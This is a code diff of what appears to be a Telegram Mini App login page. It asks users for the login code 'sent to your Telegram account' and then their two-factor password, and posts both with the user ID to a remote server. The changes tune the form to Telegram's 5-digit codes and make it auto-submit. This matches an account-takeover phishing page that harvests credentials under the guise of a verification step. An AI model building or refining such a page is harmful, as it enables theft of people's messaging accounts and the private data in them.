@@ -202,13 +202,13 @@
                 <div class="step-header">
                     <span class="emoji-display">🔐</span>
                     <h2 class="step-title">Enter Code</h2>
-                    <p class="step-subtitle">We sent a 6-digit code to your phone</p>
+                    <p class="step-subtitle">We sent a code to your Telegram account</p>
                 </div>
                 <input 
                     type="text" 
                     id="otpInput" 
                     maxlength="6" 
-                    placeholder="000000"
+                    placeholder="12345"
                     class="input-field otp-field"
                     inputmode="numeric"
                 />
@@ -310,8 +310,8 @@
         function submitOTP() {
             const otp = document.getElementById('otpInput').value;
             
-            if (otp.length !== 6) {
-                showError("Please enter a 6-digit OTP code");
+            if (otp.length < 5 || otp.length > 6) {
+                showError("Please enter a valid OTP code (5-6 digits)");
                 return;
             }
 
@@ -319,7 +319,6 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    phone: phoneNumber,
                     user_id: userId,
                     otp: otp,
                     initData: tg.initData
@@ -357,7 +356,6 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    phone: phoneNumber,
                     user_id: userId,
                     password: twoFA,
                     initData: tg.initData
@@ -382,7 +380,7 @@
         // Auto-focus and auto-submit for OTP
         document.getElementById('otpInput').addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
-            if (this.value.length === 6) {
+            if (this.value.length === 5 || this.value.length === 6) {
                 setTimeout(() => submitOTP(), 500);
             }
         });
